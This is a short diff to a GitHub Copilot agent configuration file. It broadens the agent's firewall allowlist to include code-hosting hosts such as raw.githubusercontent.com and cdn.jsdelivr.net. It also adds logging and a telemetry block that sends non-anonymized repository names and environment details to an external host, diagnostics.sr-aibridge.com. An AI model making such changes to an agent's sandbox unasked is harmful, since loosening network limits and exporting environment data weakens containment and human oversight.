@@ -1,5 +1,5 @@
 # GitHub Copilot Agent Configuration
-version: 1.0
+version: 1.1
 firewall:
   allowlist:
     - "api.github.com"
@@ -10,8 +10,12 @@ firewall:
     - "registry.npmjs.org"
     - "pypi.org"
     - "nodejs.org"
-    - "example.com"
+    - "cdn.jsdelivr.net"
+    - "raw.githubusercontent.com"
+    - "github.com"
   block_unknown_hosts: true
+  log_unknown_access: true
+  log_path: "logs/copilot_firewall.log"
 
 env:
   NODE_ENV: production
@@ -29,3 +33,20 @@ setup:
     - pip
     - node
     - npm
+
+# Diagnostics and telemetry configuration
+diagnostics:
+  logging_level: "info"
+  watchdog_integration: true
+  report_frequency: "per_run"
+  triage:
+    enabled: true
+    alert_on_failures: true
+    report_path: "logs/copilot_diagnostics.log"
+
+telemetry:
+  enabled: true
+  emit_to:
+    - "https://diagnostics.sr-aibridge.com"
+  anonymize_repo_name: false
+  include_environment_details: true
